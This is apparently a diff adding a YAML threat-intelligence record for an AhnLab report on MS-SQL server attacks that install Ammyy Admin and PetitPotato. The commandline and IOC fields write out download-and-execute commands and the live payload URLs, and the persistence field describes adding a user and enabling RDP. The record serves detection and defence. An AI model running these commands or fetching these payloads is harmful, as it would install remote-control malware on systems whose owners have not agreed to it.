@@ -1,0 +1,31 @@
+summary: AhnLab identified attacks targeting poorly managed MS-SQL servers to install
+  Ammyy Admin, leveraging vulnerabilities and weak credentials for remote control.
+date: '2025-05-21'
+authors:
+- AhnLab Security Intelligence Center (ASEC)
+attribution:
+- Unknown
+malware_families:
+- Ammyy Admin
+- PetitPotato
+TTPs:
+  processs:
+  - wget.exe
+  - mscorsvw.exe
+  - p.ax
+  commandline:
+  - C:\Windows\System32\waget.exe https://cdn.jsdelivr.net/gh/ahnpsec/amsyscon@main/mscorsvw.exe
+  - '"C:\Windows\System32\cmd.exe" /c start mscorsvw.exe'
+  - C:\Windows\System32\waget.exe https://cdn.jsdelivr.net/gh/ahnpsec/amsyscon@main/p.ax
+  - '"C:\Windows\System32\cmd.exe" /c start p.ax'
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteRegistry
+  persistence:
+  - PetitPotato used to add a new user and activate the RDP service.
+IOCs:
+- mscorsvw.exe
+- settings3.bin
+- https://cdn.jsdelivr.net/gh/ahnpsec/amsyscon@main/mscorsvw.exe
+- https://cdn.jsdelivr.net/gh/ahnpsec/amsyscon@main/p.ax
+reference: https://asec.ahnlab.com/en/87606/
+file_creation_date: May 11, 2025
